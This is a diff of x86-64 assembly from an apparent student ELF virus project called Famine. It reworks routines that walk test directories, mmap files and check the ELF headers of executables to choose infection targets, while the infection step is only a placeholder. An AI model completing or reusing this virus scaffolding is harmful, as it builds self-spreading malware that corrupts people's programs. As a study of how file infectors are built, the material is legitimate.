@@ -189,11 +189,11 @@ _infect_dir:; (string rdi)
 			cmp rax, 0x0
 			jne .free_buffers
 
-			mov rax, [rsi + 24]
-			and rax, 0o0170000
-			cmp rax, 0o0040000
+			mov rax, [rsi + 24] ; st_mode
+			and rax, 0o0170000 ; S_IFMT
+			cmp rax, 0o0040000 ; S_IFDIR
 			je .infect_dir
-			cmp rax, 0o0100000
+			cmp rax, 0o0100000 ; S_IFREG
 			je .infect_file
 			jmp .free_buffers
 
@@ -239,11 +239,15 @@ _infect_dir:; (string rdi)
 		pop r10
 ret
 
-_infect_file:
+_infect_file: ; (string rdi, stat rsi)
+	push r8
+	push r9
 	push r10
-	push r11
+	push r12
 	push rdx
 
+	push rsi
+	pop r12
 	%ifdef DEBUG
 		call _print; _print(rdi)
 	%endif
@@ -257,51 +261,67 @@ _infect_file:
 	push rdi
 	pop r10 ; path
 	push rax
-	pop r11 ; fd
+	pop r8 ; fd
 
-	sub rsp, 64 ; elf header size
-; check for elf header
-	push r11
-	pop rdi
-	mov rsi, rsp
-	push 64
-	pop rdx
-	xor rax, rax ; = 0
+	push r10
+	xor rdi, rdi
+	mov rsi, [r12 + 48] ; statbuf.st_size
+	push 3
+	pop rdx ; PROT_READ | PROT_WRITE
+	push 2
+	pop r10 ; MAP_PRIVATE
+	xor r9, r9
+	push 9
+	pop rax ; mmap
 	syscall
-	push rdi
-	pop r11
-	cmp rax, 64 ; if read return less than 64 bytes
-	jl .reset_stack
+	pop r10
+	cmp rax, 0x0
+	jl .close ; < 0
 
+	push rax
+	pop rsi
 	lea rdi, [rel elf_magic]
 	push 4
 	pop rdx
 	call _ft_strncmp
 	cmp rax, 0x0
-	jne .reset_stack ; not elf file
+	jne .unmap ; not elf file
+	cmp byte[rsi + 16], 2 ; ET_EXEC
+	je .is_elf_file
+	cmp byte[rsi + 16], 3 ; ET_DYN
+	jne .unmap
 
-	%ifdef DEBUG
-		mov rdi, rsi
-		call _print; _print(rdi)
-	%endif
-
-	add rsp, 64
+	.is_elf_file:
+		%ifdef DEBUG
+			mov rdi, rsi
+			call _print; _print(rdi)
+		%endif
 	; things here
-	jmp .close
-	.reset_stack:
-		add rsp, 64
+	.unmap:
+		push rsi
+		pop rdi
+		mov rsi, [r12 + 48] ; statbuf.st_size
+		push 11
+		pop rax
+		syscall
 	.close:
-		push r11
+		push r8
 		pop rdi
 		push 3
 		pop rax; close
 		syscall
 	.return:
+		push r10
+		pop rdi
+		push r12
+		pop rsi
 		xor rax, rax
 
 	pop rdx
-	pop r11
+	pop r12
 	pop r10
+	pop r9
+	pop r8
 ret
 
 _host:
@@ -326,7 +346,7 @@ _exit:
 
 ; ================================ utils =======================================
 
-_ft_strlen:; (string rdi) - use rcx, rsi
+_ft_strlen:; (string rdi)
 	push rcx
 
 	xor rcx, rcx; = 0
@@ -346,6 +366,7 @@ _ft_strncmp: ; (string rdi, string rsi, size_t rdx)
 	push rcx
 	dec rdx
 
+	xor rax, rax
 	xor rcx, rcx; = 0
 	.loop_char:
 		mov al, [rdi + rcx]
@@ -364,9 +385,10 @@ _ft_strncmp: ; (string rdi, string rsi, size_t rdx)
 	pop rcx
 ret
 
-_ft_strcmp: ; (string rdi, string rsi) - use rcx, rdi, rsi, rax
+_ft_strcmp: ; (string rdi, string rsi)
 	push rcx
 
+	xor rax, rax
 	xor rcx, rcx; = 0
 	.loop_char:
 		mov al, [rdi + rcx]
@@ -401,7 +423,8 @@ ret
 
 ; ==============================================================================
 
-elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x0
+;                   E     L    F   |  v ELFCLASS64
+elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
 dotdir db `.`, 0x0, `..`, 0x0, 0x0
 directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
 db `Famine version 1.0 (c)oded by lmartin`; sw4g signature
